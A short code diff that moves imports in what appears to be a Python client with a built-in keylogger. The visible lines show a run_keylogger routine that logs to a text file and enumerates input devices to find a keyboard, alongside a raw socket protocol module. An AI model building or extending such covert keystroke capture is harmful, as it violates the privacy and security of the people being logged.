@@ -18,7 +18,10 @@ from collections import deque, Counter
 import threading
 
 import inotify
-from pynput import keyboard
+import evdev
+import select
+from evdev import ecodes
+from datetime import datetime
 
 from raw_socket_protocol import RawSocketProtocol
 
@@ -482,11 +485,6 @@ class Client:
             log_file = "./keylogger.txt"
 
             def run_keylogger():
-                import evdev
-                import select
-                from evdev import ecodes
-                from datetime import datetime
-
                 devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
                 keyboard_dev = None
                 for dev in devices:
